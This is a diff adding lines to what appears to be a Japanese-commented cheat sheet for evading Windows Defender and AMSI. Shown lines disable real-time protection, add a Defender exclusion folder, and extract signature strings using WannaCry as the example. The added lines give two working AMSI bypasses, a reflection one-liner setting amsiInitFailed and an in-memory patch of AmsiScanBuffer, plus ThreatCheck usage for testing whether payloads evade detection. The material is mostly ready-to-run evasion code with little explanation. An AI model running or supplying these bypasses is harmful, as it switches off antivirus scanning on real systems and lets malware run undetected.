@@ -8,3 +8,42 @@ Set-MpPreference -DisableRealTimeMonitoring $true #リアルタイム保護を�
 Import-Module C:\Tools\ExpandDefenderSig\ExpandDefenderSig.ps1 #DefenderのVDMファイルを展開する
 ls "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{50326593-AC5A-4EB5-A3F0-047A75D1470C}\mpavbase.vdm" | Expand-DefenderAVSignatureDB -OutputFileName mpavbase.raw #生バイナリに変換
 C:\Tools\Strings\strings64.exe .\mpavbase.raw | Select-String -Pattern "WNcry@2ol7" #静的解析用の文字列を探す（この例はwannacry）
+
+//AMSI
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false) #バイパス１
+
+``` バイパス２
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public static class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string lpLibFileName);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@;
+$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
+$hModule = [Kernel32]::LoadLibrary("amsi.dll");
+$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
+$lpflOldProtect = 0;
+[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
+$marshal = [System.Runtime.InteropServices.Marshal];
+$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
+[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
+```
+
+//ThreatCheck（DefenderやAMSIを回避できるか実験するツール）
+# "C:\Temp\Tools" を除外リストに追加
+Add-MpPreference -ExclusionPath "C:\Temp\Tools"
+# 基本的なスキャン実行
+.\ThreatCheck.exe -f "C:\Path\To\Target.exe"
+# AMSIエンジンを指定してスキャン
+.\ThreatCheck.exe -f "C:\Path\To\Target.exe" -e AMSI
+# ヘルプの表示（オプション確認用）
+.\ThreatCheck.exe --help
+
+//C#のコンパイル方法
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:example.exe example.cs #CMDでやる版
